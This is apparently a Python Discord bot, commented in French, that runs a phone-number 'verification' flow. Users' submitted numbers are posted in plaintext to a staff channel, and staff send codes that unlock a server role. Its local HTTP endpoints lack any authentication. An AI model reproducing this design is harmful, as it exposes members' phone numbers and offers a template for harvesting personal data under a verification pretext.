import discord
from discord.ext import commands
from discord.ui import Button, View
import secrets
import sqlite3
from datetime import datetime, timedelta
from aiohttp import web
import asyncio
import config

# Configuration des intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Connexion BDD
def get_db():
    return sqlite3.connect('verif.db')

class VerifyView(View):
    """View avec bouton pour lancer la vérification"""
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🔐 Vérifier mon compte", style=discord.ButtonStyle.primary, custom_id="verify_button")
    async def verify_button_callback(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer(ephemeral=True)
        
        # Générer un token unique
        token = secrets.token_urlsafe(16)
        expires = datetime.utcnow() + timedelta(hours=1)
        
        with get_db() as conn:
            conn.execute(
                'INSERT INTO verifications (token, user_id, expires_at) VALUES (?, ?, ?)',
                (token, interaction.user.id, expires)
            )
        
        # Créer le lien de vérification
        link = f"{config.SITE_URL}/verify/{token}"
        
        # Créer un embed
        embed = discord.Embed(
            title="📱 Vérification téléphonique",
            description="Clique sur le bouton ci-dessous pour commencer la vérification.",
            color=discord.Color.blue()
        )
        embed.add_field(name="⏰ Expiration", value="Ce lien expire dans 1 heure", inline=True)
        embed.set_footer(text="Un staff te contactera après avoir fourni ton numéro")
        
        # Bouton lien
        view = View()
        view.add_item(Button(label="✅ Commencer la vérification", url=link, style=discord.ButtonStyle.link))
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

@bot.event
async def on_ready():
    print(f'✅ Bot connecté en tant que {bot.user}')
    print(f'📝 Serveur: {bot.get_guild(config.GUILD_ID)}')
    print(f'🔑 Rôle ID: {config.ROLE_ID}')
    
    # Initialiser la BDD
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS verifications (
                token TEXT PRIMARY KEY,
                user_id INTEGER,
                phone TEXT,
                code TEXT,
                staff_id INTEGER,
                expires_at TIMESTAMP
            )
        ''')
    
    # Ajouter la vue persistante
    bot.add_view(VerifyView())
    
    # Lancer le serveur HTTP
    asyncio.create_task(run_http_server())
    
    print("🚀 Bot prêt!")

@bot.command()
@commands.has_permissions(administrator=True)
async def setup_verify(ctx):
    """Envoie le message de vérification dans le salon actuel"""
    embed = discord.Embed(
        title="🌟 Bienvenue sur le serveur ! 🌟",
        description="Pour accéder à l'intégralité du serveur, tu dois vérifier ton compte.",
        color=discord.Color.gold()
    )
    embed.add_field(
        name="📋 Comment ça fonctionne ?",
        value=(
            "1️⃣ Clique sur le bouton ci-dessous\n"
            "2️⃣ Entre ton numéro de téléphone\n"
            "3️⃣ Un staff te contactera avec un code secret\n"
            "4️⃣ Entre le code sur le site pour obtenir l'accès complet"
        ),
        inline=False
    )
    embed.add_field(
        name="🔒 Confidentialité",
        value="Ton numéro ne sera utilisé que pour cette vérification.",
        inline=False
    )
    embed.set_footer(text="Système anti-bot • Vérification téléphonique")
    
    await ctx.send(embed=embed, view=VerifyView())
    await ctx.message.delete()
    print(f"📨 Message de vérification envoyé dans {ctx.channel.name}")

@bot.command()
@commands.has_permissions(administrator=True)
async def code(ctx, token: str = None, code: str = None):
    """Gère les codes de vérification"""
    if not token:
        # Afficher les demandes en attente
        with get_db() as conn:
            cur = conn.execute(
                'SELECT token, user_id, phone FROM verifications WHERE phone IS NOT NULL AND code IS NULL'
            )
            pending = cur.fetchall()
        
        if not pending:
            embed = discord.Embed(
                title="📋 Aucune demande en attente",
                color=discord.Color.orange()
            )
            await ctx.send(embed=embed)
            return
        
        embed = discord.Embed(
            title="📋 Demandes en attente de code",
            color=discord.Color.blue()
        )
        for p in pending[:5]:
            embed.add_field(
                name=f"Jeton: {p[0][:8]}...",
                value=f"👤 <@{p[1]}>\n📞 {p[2]}\n📝 `!code {p[0]} CODE`",
                inline=False
            )
        await ctx.send(embed=embed)
        return
    
    if not code:
        await ctx.send("❌ Utilisation: `!code <jeton> <code>`")
        return
    
    # Enregistrer le code
    with get_db() as conn:
        cur = conn.execute(
            'UPDATE verifications SET code = ?, staff_id = ? WHERE token = ? AND code IS NULL',
            (code, ctx.author.id, token)
        )
        if cur.rowcount == 0:
            await ctx.send("❌ Jeton invalide ou déjà utilisé.")
        else:
            # Récupérer les infos
            cur = conn.execute(
                'SELECT user_id, phone FROM verifications WHERE token = ?',
                (token,)
            )
            user_id, phone = cur.fetchone()
            
            embed = discord.Embed(
                title="✅ Code enregistré",
                color=discord.Color.green()
            )
            embed.add_field(name="👤 Utilisateur", value=f"<@{user_id}>")
            embed.add_field(name="📞 Téléphone", value=phone)
            embed.add_field(name="🔑 Code", value=f"`{code}`")
            await ctx.send(embed=embed)
            
            # MP à l'utilisateur
            try:
                user = await bot.fetch_user(user_id)
                mp_embed = discord.Embed(
                    title="🔑 Code de vérification",
                    description=f"Ton code secret est : **{code}**",
                    color=discord.Color.green()
                )
                mp_embed.add_field(
                    name="📝 Lien",
                    value=f"{config.SITE_URL}/enter-code/{token}"
                )
                await user.send(embed=mp_embed)
            except:
                pass

# Serveur HTTP
async def handle_grant_role(request):
    data = await request.json()
    user_id = data.get('user_id')
    
    guild = bot.get_guild(config.GUILD_ID)
    if guild:
        member = guild.get_member(user_id)
        if member:
            role = guild.get_role(config.ROLE_ID)
            await member.add_roles(role, reason="Vérification réussie")
            
            # Notifier le staff
            staff_channel = bot.get_channel(config.STAFF_CHANNEL_ID)
            if staff_channel:
                embed = discord.Embed(
                    title="✅ Vérification réussie",
                    description=f"{member.mention} a été vérifié !",
                    color=discord.Color.green()
                )
                await staff_channel.send(embed=embed)
            
            return web.Response(text="OK")
    return web.Response(status=400, text="Erreur")

async def handle_phone_submitted(request):
    data = await request.json()
    token = data.get('token')
    phone = data.get('phone')
    user_id = data.get('user_id')
    
    staff_channel = bot.get_channel(config.STAFF_CHANNEL_ID)
    if staff_channel:
        embed = discord.Embed(
            title="📱 Nouvelle demande",
            color=discord.Color.blue()
        )
        embed.add_field(name="👤 Utilisateur", value=f"<@{user_id}>")
        embed.add_field(name="📞 Téléphone", value=f"`{phone}`")
        embed.add_field(name="🔑 Jeton", value=f"`{token}`")
        embed.add_field(name="📝 Action", value=f"`!code {token} CODE`")
        
        await staff_channel.send(embed=embed)
    
    return web.Response(text="OK")

async def run_http_server():
    app = web.Application()
    app.router.add_post('/grant_role', handle_grant_role)
    app.router.add_post('/phone_submitted', handle_phone_submitted)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, 'localhost', 5001)
    await site.start()
    print("🌐 Serveur HTTP démarré sur le port 5001")

# Démarrer le bot
if __name__ == '__main__':
    bot.run(config.BOT_TOKEN)